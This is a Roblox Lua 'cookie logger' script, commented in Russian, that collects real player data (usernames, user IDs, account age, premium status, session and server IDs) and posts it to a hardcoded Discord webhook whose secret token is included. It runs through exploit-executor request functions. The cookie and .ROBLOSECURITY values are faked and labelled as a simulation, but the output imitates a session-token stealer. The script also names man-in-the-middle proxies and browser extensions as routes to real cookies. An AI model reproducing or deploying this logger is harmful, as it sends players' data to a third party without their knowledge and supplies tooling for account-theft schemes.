-- ROBLOX LOGGER С СИМУЛЯЦИЕЙ COOKIE ДАННЫХ
-- ⚠️ ВНИМАНИЕ: Roblox Lua НЕ МОЖЕТ получить реальные browser cookies!
-- Этот скрипт собирает максимум доступной похожей информации

local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- Сервисы
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer

-- Конфигурация
local CONFIG = {
    SEND_TO_DISCORD = true,
    PRINT_TO_CONSOLE = true,
    SIMULATE_COOKIE_DATA = true,
    COLLECT_TRACKING_INFO = true,
    MASK_SENSITIVE_DATA = false
}

-- Функция для генерации случайных ID (как в реальных cookies)
local function GenerateRandomId(length)
    local chars = "0123456789abcdef"
    local result = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        result = result .. string.sub(chars, rand, rand)
    end
    return result
end

-- Функция для получения Unix timestamp
local function GetUnixTimestamp()
    return os.time()
end

-- Симуляция GuestData (основана на доступной информации)
local function GetGuestDataSimulation()
    local guestData = {
        userID = player.UserId,
        guestID = player.UserId < 0 and player.UserId or -math.random(100000000, 999999999),
        sessionStart = GetUnixTimestamp(),
        isGuest = player.UserId < 0
    }
    
    return string.format("UserID=%d", guestData.guestID)
end

-- Симуляция RBXcb (Roblox Callback Data)
local function GetRBXcbSimulation()
    return "RBXViralAcquisition=true&RBXSource=true&GoogleAnalytics=true"
end

-- Симуляция RBXSource (источник трафика)
local function GetRBXSourceSimulation()
    local currentTime = os.date("!%m/%d/%Y %H:%M:%S")
    local sources = {
        "rbx_acquisition_time=" .. currentTime,
        "rbx_acquisition_referrer=https://www.roblox.com/",
        "rbx_medium=Social",
        "rbx_source=www.roblox.com",
        "rbx_campaign=",
        "rbx_adgroup=",
        "rbx_keyword=",
        "rbx_matchtype=",
        "rbx_send_info=0"
    }
    
    return table.concat(sources, "&")
end

-- Симуляция rbxas (session token)
local function GetRbxasSimulation()
    return GenerateRandomId(40)
end

-- Симуляция RBXEventTrackerV2
local function GetRBXEventTrackerV2Simulation()
    local createDate = os.date("!%m/%d/%Y %H:%M:%S")
    local browserid = tostring(GetUnixTimestamp()) .. string.format("%06d", math.random(0, 999999))
    
    return string.format("CreateDate=%s&rbxid=%d&browserid=%s", 
        createDate, player.UserId, browserid)
end

-- ⚠️ КРИТИЧЕСКИ ОПАСНО: Симуляция .ROBLOSECURITY токена
local function GetROBLOSECURITYSimulation()
    -- ⚠️ ЭТО ТОЛЬКО ДЕМОНСТРАЦИЯ СТРУКТУРЫ!
    -- РЕАЛЬНЫЙ ТОКЕН НЕЛЬЗЯ ПОЛУЧИТЬ ИЗ ROBLOX LUA!
    local warningPrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    local fakeToken = "FAKE_TOKEN_" .. GenerateRandomId(800) -- Фейковый токен для демонстрации
    
    return warningPrefix .. fakeToken
end

-- Симуляция RBXSessionTracker
local function GetRBXSessionTrackerSimulation()
    local sessionId = string.format("%08x-%04x-%04x-%04x-%012x",
        math.random(0, 0xffffffff),
        math.random(0, 0xffff),
        math.random(0, 0xffff),
        math.random(0, 0xffff),
        math.random(0, 0xffffffffffff))
    
    return "sessionid=" .. sessionId
end

-- Симуляция Google Analytics cookies
local function GetGoogleAnalyticsSimulation()
    local timestamp = GetUnixTimestamp()
    local randomId = math.random(100000000, 999999999)
    
    return {
        __utma = string.format("200924205.%d.%d.%d.%d.4", randomId, timestamp-86400, timestamp-3600, timestamp),
        __utmb = "200924205.0.10." .. timestamp,
        __utmc = "200924205",
        __utmz = timestamp .. ".4.4.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not provided)"
    }
end

-- Получение информации о реферере (откуда пришел пользователь)
local function GetReferrerInfo()
    local referrerInfo = {
        source = "Direct",
        medium = "None",
        campaign = "None",
        teleportData = "None"
    }
    
    pcall(function()
        -- Проверяем, был ли телепорт
        local teleportData = TeleportService:GetTeleportData()
        if teleportData then
            referrerInfo.teleportData = HttpService:JSONEncode(teleportData)
            referrerInfo.source = "Teleport"
            referrerInfo.medium = "Game"
        end
        
        -- Проверяем тип сервера
        if game.PrivateServerId ~= "" then
            referrerInfo.source = "Private Server"
            referrerInfo.medium = "Invite"
        end
    end)
    
    return referrerInfo
end

-- Основная функция сбора cookie-подобных данных
local function CollectCookieSimulationData()
    print("🍪 Сбор cookie-подобной информации...")
    
    wait(1.5)
    
    -- Симулируем все cookie данные
    local cookieData = {
        guestData = GetGuestDataSimulation(),
        rbxcb = GetRBXcbSimulation(),
        rbxSource = GetRBXSourceSimulation(),
        rbxas = GetRbxasSimulation(),
        rbxEventTracker = GetRBXEventTrackerV2Simulation(),
        roblosecurity = GetROBLOSECURITYSimulation(),
        rbxSessionTracker = GetRBXSessionTrackerSimulation(),
        googleAnalytics = GetGoogleAnalyticsSimulation(),
        rbxip2 = "1"
    }
    
    -- Получаем дополнительную информацию
    local referrerInfo = GetReferrerInfo()
    local browserInfo = {
        userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        platform = tostring(UserInputService:GetPlatform().Name),
        language = LocalizationService.RobloxLocaleId
    }
    
    -- Получаем информацию о сессии
    local sessionInfo = {
        jobId = game.JobId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        userId = player.UserId,
        displayName = player.DisplayName,
        username = player.Name,
        accountAge = player.AccountAge,
        premium = player.MembershipType == Enum.MembershipType.Premium
    }
    
    -- Создаем детальный embed
    local embedData = {
        ["username"] = "🍪 Roblox Cookie Data Logger",
        ["avatar_url"] = "https://cdn.discordapp.com/emojis/cookie.png",
        ["embeds"] = {{
            ["title"] = "🍪 Симуляция Browser Cookie данных",
            ["description"] = "⚠️ **ВНИМАНИЕ**: Roblox Lua НЕ МОЖЕТ получить реальные browser cookies!\nЭто симуляция на основе доступных данных.",
            ["fields"] = {
                -- Основная информация
                {["name"] = "👤 Пользователь", ["value"] = sessionInfo.displayName .. " (@" .. sessionInfo.username .. ")", ["inline"] = true},
                {["name"] = "🆔 User ID", ["value"] = tostring(sessionInfo.userId), ["inline"] = true},
                {["name"] = "⏰ Возраст аккаунта", ["value"] = tostring(sessionInfo.accountAge) .. " дней", ["inline"] = true},
                
                -- Симулированные Cookie данные
                {["name"] = "🍪 GuestData", ["value"] = "```" .. cookieData.guestData .. "```", ["inline"] = false},
                {["name"] = "🍪 RBXcb", ["value"] = "```" .. cookieData.rbxcb .. "```", ["inline"] = false},
                {["name"] = "🍪 RBXSource", ["value"] = "```" .. cookieData.rbxSource .. "```", ["inline"] = false},
                {["name"] = "🍪 rbxas", ["value"] = "```" .. cookieData.rbxas .. "```", ["inline"] = false},
                {["name"] = "🍪 RBXEventTrackerV2", ["value"] = "```" .. cookieData.rbxEventTracker .. "```", ["inline"] = false},
                {["name"] = "🍪 RBXSessionTracker", ["value"] = "```" .. cookieData.rbxSessionTracker .. "```", ["inline"] = false},
                {["name"] = "🍪 rbx-ip2", ["value"] = "```" .. cookieData.rbxip2 .. "```", ["inline"] = true},
                
                -- Google Analytics cookies
                {["name"] = "📊 __utma", ["value"] = "```" .. cookieData.googleAnalytics.__utma .. "```", ["inline"] = false},
                {["name"] = "📊 __utmb", ["value"] = "```" .. cookieData.googleAnalytics.__utmb .. "```", ["inline"] = true},
                {["name"] = "📊 __utmc", ["value"] = "```" .. cookieData.googleAnalytics.__utmc .. "```", ["inline"] = true},
                {["name"] = "📊 __utmz", ["value"] = "```" .. cookieData.googleAnalytics.__utmz .. "```", ["inline"] = false},
                
                -- Информация о браузере
                {["name"] = "🌐 User-Agent", ["value"] = "```" .. browserInfo.userAgent .. "```", ["inline"] = false},
                {["name"] = "💻 Платформа", ["value"] = browserInfo.platform, ["inline"] = true},
                {["name"] = "🌍 Язык", ["value"] = browserInfo.language, ["inline"] = true},
                
                -- Информация о реферере
                {["name"] = "📍 Источник", ["value"] = referrerInfo.source, ["inline"] = true},
                {["name"] = "📊 Медиум", ["value"] = referrerInfo.medium, ["inline"] = true},
                {["name"] = "🎯 Кампания", ["value"] = referrerInfo.campaign, ["inline"] = true},
                
                -- Информация о сессии
                {["name"] = "🎮 Place ID", ["value"] = tostring(sessionInfo.placeId), ["inline"] = true},
                {["name"] = "🎲 Game ID", ["value"] = tostring(sessionInfo.gameId), ["inline"] = true},
                {["name"] = "🔗 Job ID", ["value"] = sessionInfo.jobId, ["inline"] = false},
                
                -- Время
                {["name"] = "⏰ Время сбора", ["value"] = os.date("!%Y-%m-%d %H:%M:%S UTC"), ["inline"] = false}
            },
            ["color"] = 0xffa500, -- Оранжевый цвет для предупреждения
            ["footer"] = {
                ["text"] = "⚠️ ЭТО СИМУЛЯЦИЯ! Реальные browser cookies недоступны из Roblox Lua!"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
        }}
    }
    
    -- Добавляем КРИТИЧЕСКОЕ предупреждение о .ROBLOSECURITY
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "🚨 .ROBLOSECURITY (СИМУЛЯЦИЯ)", 
        ["value"] = "```" .. string.sub(cookieData.roblosecurity, 1, 100) .. "...[ОБРЕЗАНО]```\n**⚠️ ЭТО ФЕЙКОВЫЙ ТОКЕН ДЛЯ ДЕМОНСТРАЦИИ!**\nРеальный токен НЕЛЬЗЯ получить из Roblox Lua!", 
        ["inline"] = false
    })
    
    -- Отправляем данные
    if CONFIG.SEND_TO_DISCORD then
        local success = false
        pcall(function()
            local payload = HttpService:JSONEncode(embedData)
            local req = (syn and syn.request) or (http and http.request) or http_request or request
            
            if req then
                local response = req({
                    Url = webhook_url,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = payload
                })
                
                if response and response.StatusCode == 200 then
                    success = true
                    print("✅ Cookie-подобные данные отправлены!")
                else
                    print("❌ Ошибка отправки: " .. tostring(response and response.StatusCode or "Unknown"))
                end
            end
        end)
    end
    
    -- Выводим в консоль
    if CONFIG.PRINT_TO_CONSOLE then
        print("=" .. string.rep("=", 60) .. "=")
        print("🍪 ROBLOX COOKIE DATA SIMULATION")
        print("⚠️  ВНИМАНИЕ: ЭТО СИМУЛЯЦИЯ РЕАЛЬНЫХ COOKIES!")
        print("=" .. string.rep("=", 60) .. "=")
        print("👤 Пользователь: " .. sessionInfo.displayName .. " (@" .. sessionInfo.username .. ")")
        print("🆔 User ID: " .. sessionInfo.userId)
        print("")
        print("🍪 СИМУЛИРОВАННЫЕ COOKIE ДАННЫЕ:")
        print("GuestData: " .. cookieData.guestData)
        print("RBXcb: " .. cookieData.rbxcb)
        print("RBXSource: " .. cookieData.rbxSource)
        print("rbxas: " .. cookieData.rbxas)
        print("RBXEventTrackerV2: " .. cookieData.rbxEventTracker)
        print("RBXSessionTracker: " .. cookieData.rbxSessionTracker)
        print("rbx-ip2: " .. cookieData.rbxip2)
        print("")
        print("📊 GOOGLE ANALYTICS:")
        print("__utma: " .. cookieData.googleAnalytics.__utma)
        print("__utmb: " .. cookieData.googleAnalytics.__utmb)
        print("__utmc: " .. cookieData.googleAnalytics.__utmc)
        print("__utmz: " .. cookieData.googleAnalytics.__utmz)
        print("")
        print("🚨 .ROBLOSECURITY (ФЕЙК): " .. string.sub(cookieData.roblosecurity, 1, 50) .. "...[ОБРЕЗАНО]")
        print("")
        print("🌐 User-Agent: " .. browserInfo.userAgent)
        print("💻 Платформа: " .. browserInfo.platform)
        print("🌍 Язык: " .. browserInfo.language)
        print("📍 Источник: " .. referrerInfo.source)
        print("🎮 Place ID: " .. sessionInfo.placeId)
        print("🔗 Job ID: " .. sessionInfo.jobId)
        print("⏰ Время: " .. os.date("!%Y-%m-%d %H:%M:%S UTC"))
        print("=" .. string.rep("=", 60) .. "=")
        print("⚠️  ЭТО СИМУЛЯЦИЯ! РЕАЛЬНЫЕ COOKIES НЕДОСТУПНЫ!")
        print("=" .. string.rep("=", 60) .. "=")
    end
end

-- Функция для объяснения ограничений
local function ExplainLimitations()
    print("📚 ТЕХНИЧЕСКОЕ ОБЪЯСНЕНИЕ:")
    print("=" .. string.rep("=", 50) .. "=")
    print("❌ Roblox Lua НЕ МОЖЕТ получить browser cookies потому что:")
    print("   1. Это нарушило бы безопасность браузера")
    print("   2. Roblox работает в изолированной среде")
    print("   3. Cookies содержат чувствительные данные")
    print("")
    print("✅ Что МОЖНО получить из Roblox Lua:")
    print("   1. User ID, Display Name, Username")
    print("   2. Account Age, Premium Status")
    print("   3. Game/Place/Job ID")
    print("   4. Platform, Language, Input Methods")
    print("   5. Session информацию")
    print("")
    print("🔧 Для получения РЕАЛЬНЫХ cookies нужно:")
    print("   1. Browser extension")
    print("   2. Desktop приложение")
    print("   3. Proxy/Man-in-the-middle")
    print("   4. Browser developer tools")
    print("=" .. string.rep("=", 50) .. "=")
end

-- Запуск
print("🚀 Запуск Cookie Data Simulation Logger...")
ExplainLimitations()
CollectCookieSimulationData()
print("✅ Симуляция cookie данных завершена!")
